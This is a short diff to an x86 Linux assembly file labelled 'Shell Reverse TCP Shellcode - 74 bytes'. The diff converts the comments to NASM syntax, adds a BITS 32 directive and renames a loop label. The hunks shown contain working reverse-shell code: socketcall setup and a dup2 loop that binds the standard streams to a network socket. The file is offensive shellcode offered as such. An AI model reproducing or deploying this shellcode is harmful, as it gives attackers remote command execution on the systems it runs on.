@@ -1,16 +1,17 @@
-//
-//  RevShell.asm
-//  
-//
-//  Created by Shannon Zoch on 6/29/15.
-//*
-//*  Title:    Shell Reverse TCP Shellcode - 74 bytes
-//*  Platform: Linux/x86
-//*  Date:     2014-07-25
-//*  Author:   Julien Ahrens (@MrTuxracer)
-//  Website:  http://www.rcesecurity.com
-//
-//
+BITS 32
+;
+;  RevShell.asm
+;
+;
+;  Created by Shannon Zoch on 6/29/15.
+;*
+;*  Title:    Shell Reverse TCP Shellcode - 74 bytes
+;*  Platform: Linux/x86
+;*  Date:     2014-07-25
+;*  Author:   Julien Ahrens (@MrTuxracer)
+;  Website:  http://www.rcesecurity.com
+;
+;
 _start:
 push 0x66
 pop eax
@@ -39,7 +40,7 @@ push 0x2
 pop ecx
 xchg edx,ebx
 
-loop:
+.loop:
 mov al, 0x3f
 int 0x80
 dec ecx
